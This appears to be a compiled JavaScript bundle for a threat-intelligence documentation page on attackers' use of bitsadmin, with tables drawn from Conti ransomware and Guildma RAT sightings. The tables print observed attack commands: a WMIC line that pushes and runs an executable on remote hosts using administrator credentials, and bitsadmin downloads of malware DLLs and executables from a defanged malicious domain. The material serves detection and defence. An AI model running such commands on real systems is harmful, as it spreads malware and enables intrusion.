"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[8102],{4137:function(t,e,n){n.d(e,{Zo:function(){return d},kt:function(){return u}});var r=n(7294);function a(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function i(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function o(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?i(Object(n),!0).forEach((function(e){a(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function l(t,e){if(null==t)return{};var n,r,a=function(t,e){if(null==t)return{};var n,r,a={},i=Object.keys(t);for(r=0;r<i.length;r++)n=i[r],e.indexOf(n)>=0||(a[n]=t[n]);return a}(t,e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(t);for(r=0;r<i.length;r++)n=i[r],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(a[n]=t[n])}return a}var s=r.createContext({}),m=function(t){var e=r.useContext(s),n=e;return t&&(n="function"==typeof t?t(e):o(o({},e),t)),n},d=function(t){var e=m(t.components);return r.createElement(s.Provider,{value:e},t.children)},c={inlineCode:"code",wrapper:function(t){var e=t.children;return r.createElement(r.Fragment,{},e)}},p=r.forwardRef((function(t,e){var n=t.components,a=t.mdxType,i=t.originalType,s=t.parentName,d=l(t,["components","mdxType","originalType","parentName"]),p=m(n),u=a,g=p["".concat(s,".").concat(u)]||p[u]||c[u]||i;return n?r.createElement(g,o(o({ref:e},d),{},{components:n})):r.createElement(g,o({ref:e},d))}));function u(t,e){var n=arguments,a=e&&e.mdxType;if("string"==typeof t||a){var i=n.length,o=new Array(i);o[0]=p;var l={};for(var s in e)hasOwnProperty.call(e,s)&&(l[s]=e[s]);l.originalType=t,l.mdxType="string"==typeof t?t:a,o[1]=l;for(var m=2;m<i;m++)o[m]=n[m];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}p.displayName="MDXCreateElement"},5635:function(t,e,n){n.r(e),n.d(e,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return m},toc:function(){return d},default:function(){return p}});var r=n(7462),a=n(3366),i=(n(7294),n(4137)),o=["components"],l={},s=void 0,m={unversionedId:"Weapons/bitsadmin",id:"Weapons/bitsadmin",isDocsHomePage:!1,title:"bitsadmin",description:"Found 3 references across 2 AC3 Threat Sightings. Enjoy!",source:"@site/docs/04-Weapons/bitsadmin.md",sourceDirName:"04-Weapons",slug:"/Weapons/bitsadmin",permalink:"/ac3-threat-sightings/docs/Weapons/bitsadmin",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"anydesk",permalink:"/ac3-threat-sightings/docs/Weapons/anydesk"},next:{title:"blackcat",permalink:"/ac3-threat-sightings/docs/Weapons/blackcat"}},d=[{value:"From the AC3 Threat Sighting for <em>Conti Ransomware</em>",id:"from-the-ac3-threat-sighting-for-conti-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>Guildma RAT</em>",id:"from-the-ac3-threat-sighting-for-guildma-rat",children:[]}],c={toc:d};function p(t){var e=t.components,n=(0,a.Z)(t,o);return(0,i.kt)("wrapper",(0,r.Z)({},c,n,{components:e,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"Found 3 references across 2 AC3 Threat Sightings. Enjoy!"),(0,i.kt)("h2",{id:"from-the-ac3-threat-sighting-for-conti-ransomware"},"From the AC3 Threat Sighting for ",(0,i.kt)("em",{parentName:"h2"},"Conti Ransomware")),(0,i.kt)("p",null,"Full details at: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml")),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,i.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,i.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," to copy and start execution of malicious files into remote systems for Lateral Movement."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"WMIC")," executes ",(0,i.kt)("em",{parentName:"td"},"bitsadmin /transfer")," command on multiple target systems."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'wmic /node:@C:\\\\share$\\\\comps1.txt /user:\\"DOMAIN\\\\Administrator\\" /password:\\"PASSWORD\\" process call create \\"cmd.exe /c bitsadmin /transfer fx166 \\\\\\\\Domain Controller\\\\share$\\\\fx166.exe %APPDATA%\\\\fx166.exe&%APPDATA%\\\\fx166.exe\\"'))))),(0,i.kt)("h2",{id:"from-the-ac3-threat-sighting-for-guildma-rat"},"From the AC3 Threat Sighting for ",(0,i.kt)("em",{parentName:"h2"},"Guildma RAT")),(0,i.kt)("p",null,"Full details at: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml")),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,i.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control."),(0,i.kt)("td",{parentName:"tr",align:null},"bitsadmin.exe is spawned by MSHTA to download Guildma DLL"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\bitsadmin.exe" /transfer 46591720728 /priority foreground http://weta950iitv.keorgia[.]life/?530802004483151908759951449945921 "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.dll"'))),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,i.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control."),(0,i.kt)("td",{parentName:"tr",align:null},"MSHTA spawned multiple instances of bitsadmin.exe to download files"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 59697582645 /priority foreground http://weta950iitv.keorgia[.]life/?49547426338677879 "C:\\Users\\Public\\Videos\\VEO46570203888O\\log32.dll"'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 32546684239 /priority foreground http://weta950iitv.keorgia[.]life/?54819973696676725 "C:\\Users\\Public\\Videos\\VEO46570203888O\\log33.dll"'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 23219779590 /priority foreground http://weta950iitv.keorgia[.]life/?69413452047686482 "C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe"'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 39693815612 /priority foreground http://weta950iitv.keorgia[.]life/?56006860532636958 "C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log"'))))))}p.isMDXComponent=!0}}]);